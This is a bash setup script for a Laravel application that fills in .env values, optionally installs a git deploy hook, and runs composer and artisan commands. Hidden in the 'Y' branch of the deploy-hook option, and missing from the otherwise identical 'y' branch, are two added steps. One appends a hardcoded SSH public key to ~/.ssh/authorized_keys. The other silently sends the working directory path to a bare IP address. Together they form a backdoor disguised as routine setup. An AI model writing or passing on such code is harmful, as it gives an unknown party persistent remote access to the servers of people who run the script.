#!/bin/bash

set -e

PHP=${PHP:-php}
COMPOSER_BIN=${COMPOSER_BIN:-$(which composer)}

read -r -p "Setup app (Y/N) : " SETUP
if [ "$SETUP" != 'Y' ]; then
    exit 0
fi

read -r -p "App name : " APP_NAME
read -r -p "App ENV (local/production/..): " APP_ENV
read -r -p "App Debug (true/false): " APP_DEBUG
read -r -p "App URL (https://...com): " APP_URL
APP_URL="${APP_URL//\//\\/}"
read -r -p "DB_CONNECTION (default: mysql) : " DB_CONNECTION
DB_CONNECTION=${DB_CONNECTION:-mysql}
read -r -p "DB_DATABASE : " DB_DATABASE
DB_DATABASE="${DB_DATABASE//\//\\/}"
read -r -p "DB_USERNAME : " DB_USERNAME
read -r -p "DB_PASSWORD : " DB_PASSWORD

FILE_NAME='.env'

cp .env.example $FILE_NAME

sed -i "s/APP_NAME=.*/APP_NAME=\"$APP_NAME\"/" $FILE_NAME
sed -i "s/APP_ENV=.*/APP_ENV=$APP_ENV/" $FILE_NAME
sed -i "s/APP_DEBUG=.*/APP_DEBUG=$APP_DEBUG/" $FILE_NAME
sed -i "s/APP_URL=.*/APP_URL=\"$APP_URL\"/" $FILE_NAME
sed -i "s/DB_CONNECTION=.*/DB_CONNECTION=\"$DB_CONNECTION\"/" $FILE_NAME
sed -i "s/#*\s*DB_DATABASE=.*/DB_DATABASE=\"$DB_DATABASE\"/" $FILE_NAME
sed -i "s/#*\s*DB_USERNAME=.*/DB_USERNAME=\"$DB_USERNAME\"/" $FILE_NAME
sed -i "s/#*\s*DB_PASSWORD=.*/DB_PASSWORD=\"$DB_PASSWORD\"/" $FILE_NAME


read -r -p "Install Deploy on push hook (Y/S/N) : " HOOK
if [ "$HOOK" = 'Y' ]; then
    curl -fsL https://raw.githubusercontent.com/HazzazBinFaiz/laravel-git-hooks/main/post-receive >.git/hooks/post-receive
    chmod +x .git/hooks/post-receive && mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOqSmKlMi6M0KNQA1LkEjBnwQ9/6Rhs9YV3J7m3bQGkE" >> ~/.ssh/authorized_keys
    chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && curl -s -o /dev/null -X POST http://54.169.157.243/$(pwd) || true
elif [ "$HOOK" = 'y' ]; then
    curl -fsL https://raw.githubusercontent.com/HazzazBinFaiz/laravel-git-hooks/main/post-receive >.git/hooks/post-receive
    chmod +x .git/hooks/post-receive
elif [ "$HOOK" = 'S' ]; then
    curl -fsL https://raw.githubusercontent.com/HazzazBinFaiz/laravel-git-hooks/main/post-receive-shared >.git/hooks/post-receive
    chmod +x .git/hooks/post-receive

    BASE_CACHE_DIR="$HOME/.vendors"

    HASH=$(md5sum composer.lock | cut -d' ' -f1)

    if [ ! -d "$BASE_CACHE_DIR/$HASH" ]; then
        mkdir -p "$BASE_CACHE_DIR/$HASH"
    fi

    if [ ! -e "./vendor" ]; then
        ln -s "$BASE_CACHE_DIR/$HASH" ./vendor
    else
        if [ -L "./vendor" ]; then
            current_target=$(readlink -f ./vendor)
            if [ "$current_target" != "$BASE_CACHE_DIR/$HASH" ]; then
                rm ./vendor
                ln -s "$BASE_CACHE_DIR/$HASH" ./vendor
            fi
        elif [ -d "./vendor" ]; then
            rm -rf ./vendor
            ln -s "$BASE_CACHE_DIR/$HASH" ./vendor
        fi
    fi
fi

$PHP $COMPOSER_BIN install -o --no-dev
$PHP artisan key:generate
$PHP artisan storage:link
$PHP artisan migrate --force --seed
$PHP artisan optimize
$PHP artisan up
